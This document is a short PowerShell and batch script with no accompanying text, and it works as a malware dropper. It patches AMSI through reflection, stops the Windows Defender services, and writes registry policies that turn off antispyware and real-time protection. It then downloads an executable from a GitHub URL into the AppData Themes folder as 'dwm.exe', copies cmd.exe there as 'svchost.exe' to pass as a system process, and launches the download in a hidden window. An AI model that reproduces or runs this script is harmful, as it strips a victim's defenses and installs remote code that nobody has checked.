[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
Stop-Service -Name WdNisSvc -Force -ErrorAction SilentlyContinue

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
timeout /t 3 /nobreak

$t="$env:APPDATA\Microsoft\Windows\Themes"
New-Item -ItemType Directory -Path $t -Force | Out-Null
$wc=New-Object Net.WebClient
$wc.DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/raw/main/method34.exe', "$t\dwm.exe")

$c="$t\svchost.exe"
Copy-Item "$env:SystemRoot\System32\cmd.exe" $c -Force
Start-Process "$t\dwm.exe" -ArgumentList "`"$c /c echo done`"" -WindowStyle Hidden